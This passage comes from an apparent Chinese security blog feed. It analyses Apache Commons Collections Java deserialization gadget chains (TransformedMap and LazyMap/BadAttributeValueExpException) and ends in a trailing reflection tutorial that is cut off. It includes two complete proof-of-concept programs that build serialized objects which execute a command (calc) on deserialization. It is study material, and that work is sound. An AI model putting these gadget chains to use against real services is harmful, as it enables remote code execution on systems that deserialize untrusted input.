class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map <span class="built_in">map</span>, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        super(<span class="built_in">map</span>);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> <code>TransformedMap</code>中的<code>valueTransformer</code>在初始化时我们是可控的.</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">Object</span> put(<span class="keyword">Object</span> <span class="built_in">key</span>, <span class="keyword">Object</span> value) &#123;</span><br><span class="line">        <span class="built_in">key</span> = <span class="keyword">this</span>.transformKey(<span class="built_in">key</span>);</span><br><span class="line">        value = <span class="keyword">this</span>.transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getMap().put(<span class="built_in">key</span>, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当执行put方法时会进入<code>transformValue</code>方法:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object transformValue(Object <span class="keyword">object</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer == <span class="literal">null</span> ? <span class="keyword">object</span> : <span class="keyword">this</span>.valueTransformer.transform(<span class="keyword">object</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们可以控制这里的<code>valueTransformer</code>值为ChianedTransformer即可触发利用链。</p><p><strong>但是目前的构造仍然需要Map中的某一项去调用setValue(),我们如果想要在反序列化调用readObject()时直接触发呢?</strong></p><h5 id="AbstractInputCheckedMapDecorator类"><a href="#AbstractInputCheckedMapDecorator类" class="headerlink" title="AbstractInputCheckedMapDecorator类"></a>AbstractInputCheckedMapDecorator类</h5><p>​    调用java自带类<code>AnnotationInvocationHandler</code>中重写的readObject方法，该方法调用时会先将map转为Map.entry,然后执行setvalue操作。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var5</span><span class="selector-class">.setValue</span>((<span class="selector-tag">new</span> <span class="selector-tag">AnnotationTypeMismatchExceptionProxy</span>(<span class="selector-tag">var8</span><span class="selector-class">.getClass</span>() + "<span class="selector-attr">[<span class="string">" + var8 + "</span>]</span>"))<span class="selector-class">.setMember</span>((<span class="selector-tag">Method</span>)<span class="selector-tag">var2</span><span class="selector-class">.members</span>()<span class="selector-class">.get</span>(<span class="selector-tag">var6</span>)));</span><br></pre></td></tr></table></figure><p>TransformedMap利用Map.Entry取得第一个值，调用修改值的函数，会触发的setValue()代码</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span>(<span class="params">Object <span class="keyword">value</span></span>)</span> &#123;</span><br><span class="line">            <span class="keyword">value</span> = <span class="keyword">this</span>.parent.checkSetValue(<span class="keyword">value</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.entry.setValue(<span class="keyword">value</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>接着到了TransoformedMap的checkSetValue()方法。</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span>(<span class="params">Object <span class="keyword">value</span></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(<span class="keyword">value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这里的valueTransformer.transform实际上就是ChianedTransformer类的transform方法。就会触发刚刚我们构造的反射链。</p><h5 id="最后的POC："><a href="#最后的POC：" class="headerlink" title="最后的POC："></a>最后的POC：</h5><p>这里直接上其他大师傅们的poc:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package Serialize2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> ApacheSerialize2 implements <span class="keyword">Serializable</span> &#123;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args) throws <span class="keyword">Exception</span>&#123;</span><br><span class="line">         Transformer[] transformers = <span class="built_in">new</span> Transformer[]&#123;</span><br><span class="line">                 <span class="built_in">new</span> ConstantTransformer(Runtime.<span class="keyword">class</span>),</span><br><span class="line">                 <span class="built_in">new</span> InvokerTransformer("getMethod", <span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;String.<span class="keyword">class</span>, <span class="keyword">Class</span>[].<span class="keyword">class</span>&#125;, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;"getRuntime", <span class="built_in">new</span> <span class="keyword">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                 <span class="built_in">new</span> InvokerTransformer("invoke", <span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;<span class="keyword">Object</span>.<span class="keyword">class</span>, <span class="keyword">Object</span>[].<span class="keyword">class</span>&#125;, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;<span class="keyword">null</span>, <span class="built_in">new</span> <span class="keyword">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                 <span class="built_in">new</span> InvokerTransformer("exec", <span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;String.<span class="keyword">class</span>&#125;, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;"calc.exe"&#125;)</span><br><span class="line">         &#125;;</span><br><span class="line">         Transformer transformerChain = <span class="built_in">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">         Map map = <span class="built_in">new</span> HashMap();</span><br><span class="line">         map.put("value", "sijidou");</span><br><span class="line">         Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">Class</span> cl = <span class="keyword">Class</span>.forName("sun.reflect.annotation.AnnotationInvocationHandler");</span><br><span class="line">         Constructor ctor = cl.getDeclaredConstructor(<span class="keyword">Class</span>.<span class="keyword">class</span>, Map.<span class="keyword">class</span>);</span><br><span class="line">         ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         <span class="keyword">Object</span> instance = ctor.newInstance(Target.<span class="keyword">class</span>, transformedMap);</span><br><span class="line"></span><br><span class="line">         //序列化</span><br><span class="line">         FileOutputStream fileOutputStream = <span class="built_in">new</span> FileOutputStream("serialize3.txt");</span><br><span class="line">         ObjectOutputStream objectOutputStream = <span class="built_in">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">         objectOutputStream.writeObject(instance);</span><br><span class="line">         objectOutputStream.<span class="keyword">close</span>();</span><br><span class="line"></span><br><span class="line">         //反序列化</span><br><span class="line">         FileInputStream fileInputStream = <span class="built_in">new</span> FileInputStream("serialize3.txt");</span><br><span class="line">         ObjectInputStream objectInputStream = <span class="built_in">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line">         <span class="keyword">Object</span> result = objectInputStream.readObject();</span><br><span class="line">         objectInputStream.<span class="keyword">close</span>();</span><br><span class="line">         <span class="keyword">System</span>.<span class="keyword">out</span>.println(result);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20201108122458.png" alt=""></p><h4 id="JDK1-8–LazyMap利用链"><a href="#JDK1-8–LazyMap利用链" class="headerlink" title="JDK1.8–LazyMap利用链"></a>JDK1.8–LazyMap利用链</h4><p>​    对于JDK 1.8来说，<code>AnnotationInvocationHandler</code>类中关键的触发点，setvalue发生了改变。所以我们需要寻找新的类重写readObject来实现调用，</p><h5 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">反序列化BadAttributeValueExpException</span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">BadAttributeValueExpException</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">TideMapEntry</span>.</span></span><span class="keyword">to</span><span class="constructor">String()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">TideMapEntry</span>.</span></span>get<span class="constructor">Value()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">LazyMap</span>.</span></span>get<span class="literal">()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">ChainedTransformer</span>.</span></span>transform<span class="literal">()</span></span><br></pre></td></tr></table></figure><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>我们首先看一下LazyMap这个类,这个类也实现了一个map接口:</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> LazyMap(Map <span class="built_in">map</span>, Transformer factory)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">super</span>(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">Object</span> <span class="built_in">get</span>(<span class="keyword">Object</span> <span class="built_in">key</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">this</span>.<span class="built_in">map</span>.containsKey(<span class="built_in">key</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">Object</span> value = <span class="keyword">this</span>.factory.transform(<span class="built_in">key</span>); </span><br><span class="line">    <span class="keyword">this</span>.<span class="built_in">map</span>.put(<span class="built_in">key</span>, value);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.<span class="built_in">map</span>.<span class="built_in">get</span>(<span class="built_in">key</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        我们可以看到<strong>get方法</strong>中如果没有找到key的键值，就会调用<code>factory.transform(key);</code>,这里的factory变量属于Transformer接口类并且具体使用哪一个类来实例化对象是我们可控的。也就可以形成调用链。</p><p>那么如何去自动调用get()方法,跟进<code>TiedMapEntry</code>类</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TiedMapEntry(Map <span class="built_in">map</span>, <span class="keyword">Object</span> <span class="built_in">key</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">this</span>.<span class="built_in">map</span> = <span class="built_in">map</span>;</span><br><span class="line">  <span class="keyword">this</span>.<span class="built_in">key</span> = <span class="built_in">key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//toString方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">String</span> toString()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> getKey() + <span class="string">"="</span> + getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//getKey方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">Object</span> getValue()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.<span class="built_in">map</span>.<span class="built_in">get</span>(<span class="keyword">this</span>.<span class="built_in">key</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>TiedMapEntry</code>中，构造时传入使用<code>LazyMap</code>，调用<code>tostring()</code>方法，然后紧接着就会调用LazyMap类对象的get方法。</p><p>​    那么到目前为止，我们仍然需要一个类可以在反序列化重写readObject()时可以自动调用toString方法。完整的利用链就可以形成。</p><h5 id="BadAttributeValueExpException类"><a href="#BadAttributeValueExpException类" class="headerlink" title="BadAttributeValueExpException类"></a>BadAttributeValueExpException类</h5><p>看到<code>BadAttributeValueExpException</code>的<code>readObject</code>反序列化方法，调用了<code>toString</code>方法。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObject(ObjectInputStream ois) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        val = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Long</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Float</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Double</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Byte</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Short</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Boolean</span>) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    其中 <code>valObj</code> 为构造的 <code>TiedMapEntry</code> 类的对象，可以看到其中调用了该类的 <code>toString</code> 函数。</p><p>​    所以，我们只要构造一个<code>BadAttributeValueExpException</code>对象，并注入我们精心制造的<code>TiedMapEntry</code>对象。就可在以在反序列时，执行任意命令。</p><h5 id="最后的POC"><a href="#最后的POC" class="headerlink" title="最后的POC"></a>最后的POC</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> Exec  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BadAttributeValueExpException getObject(<span class="keyword">final</span> String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">        <span class="comment">// inert chain for setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">                <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">        <span class="comment">// real chain for after setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="keyword">Runtime</span>.<span class="keyword">class</span>),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[] &#123;</span><br><span class="line">                        String.<span class="keyword">class</span>, <span class="keyword">Class</span>[].<span class="keyword">class</span> &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[] &#123;</span><br><span class="line">                        Object.<span class="keyword">class</span>, Object[].<span class="keyword">class</span> &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="keyword">Class</span>[] &#123; String.<span class="keyword">class</span> &#125;, execArgs),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(val, entry);</span><br><span class="line">        <span class="keyword">Class</span>&lt;? <span class="keyword">extends</span> Transformer&gt; aClass = transformerChain.getClass();</span><br><span class="line"></span><br><span class="line">        Field iTransformers = aClass.getDeclaredField(<span class="string">"iTransformers"</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException calc = getObject(<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();<span class="comment">//用于存放person对象序列化byte数组的输出流</span></span><br><span class="line"></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(calc);<span class="comment">//序列化对象</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray(); <span class="comment">//读取序列化后的对象byte数组</span></span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(bytes);<span class="comment">//存放byte数组的输入流</span></span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        Object o = objectInputStream.readObject(); <span class="comment">//将byte数组输入流反序列化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20201108124637.png" alt=""></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://b1ue.cn/archives/166.html" target="_blank" rel="noopener">https://b1ue.cn/archives/166.html</a></p><p><a href="https://www.mi1k7ea.com/2019/02/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://www.secpulse.com/archives/137940.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/137940.html</a></p><p><a href="https://shaobaobaoer.cn/java-an-quan-xue-xi-bi-ji-si-apache-commons-collectionsfan-xu-lie-hua-lou-dong/" target="_blank" rel="noopener">https://shaobaobaoer.cn/java-an-quan-xue-xi-bi-ji-si-apache-commons-collectionsfan-xu-lie-hua-lou-dong/</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a></p><p><a href="https://www.xmanblog.net/java-deserialize-apache-commons-collections/" target="_blank" rel="noopener">https://www.xmanblog.net/java-deserialize-apache-commons-collections/</a></p><p><a href="https://lzwgiter.github.io/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://lzwgiter.github.io/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://xz.aliyun.com/t/4558#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/4558#toc-0</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于先知社区:&lt;a href=&quot;https://xz.aliyun.com/t/8500&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;从apache-commons-collections中学习java反序列化 - 先知社区 (aliyun.com
      
    
    </summary>
    
    
      <category term="java代码审计学习" scheme="https://shu1l.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="cc链" scheme="https://shu1l.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>java学习--反射机制</title>
    <link href="https://shu1l.github.io/2020/11/25/java-xue-xi-fan-she-ji-zhi/"/>
    <id>https://shu1l.github.io/2020/11/25/java-xue-xi-fan-she-ji-zhi/</id>
    <published>2020-11-25T08:39:33.000Z</published>
    <updated>2021-01-27T06:34:50.454Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java学习–java反射机制"><a href="#Java学习–java反射机制" class="headerlink" title="Java学习–java反射机制"></a>Java学习–java反射机制</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        反射是Java中一种动态(运行时)，通过反射可以在java动态运行时，对于任意一个类，<strong>对象可以通过反射获取到他的类，类可以通过反射拿到所有方法(包括私有)</strong>，动态获取信息，以及动态调用对象的方法的功能称为java语言的反射机制。</p><h3 id="反射的具体使用步骤"><a href="#反射的具体使用步骤" class="headerlink" title="反射的具体使用步骤"></a>反射的具体使用步骤</h3><p>在调用<code>Java</code>反射机制，主要步骤包括：</p><ul><li>获取 目标类型的<code>Class</code>对象.</li><li>通过 <code>Class</code> 对象分别获取<code>Constructor</code>类对象、<code>Method</code>类对象 &amp; <code>Field</code> 类对象.</li><li>通过 <code>Constructor</code>类对象、<code>Method</code>类对象 &amp; <code>Field</code>类对象分别获取类的构造函数、方法&amp;属性的具体信息，并进行后续操作.</li></ul><h4 id="反射获取类的class对象"><a href="#反射获取类的class对象" class="headerlink" title="反射获取类的class对象"></a>反射获取类的class对象</h4><p>要想使用反射，我们首先需要获得代操作的类所对应的Clas对象。</p><p><strong>1.常用的获取Class对象有四种方法：</strong></p><ul><li><p>使用Class类的静态方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.String"</span>)</span>;</span><br></pre></td></tr></table></figure></li><li><p>使用类的.class语法</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> clz = <span class="keyword">String</span>.<span class="keyword">class</span>;</span><br></pre></td></tr></table></figure></li><li><p>使用对象的getClass()方法</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> <span class="built_in">str</span> = <span class="keyword">new</span> <span class="keyword">String</span>(<span class="string">"Hello"</span>);</span><br><span class="line">Class clz = <span class="built_in">str</span>.getClass();</span><br></pre></td></tr></table></figure></li><li><p>Type语法</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 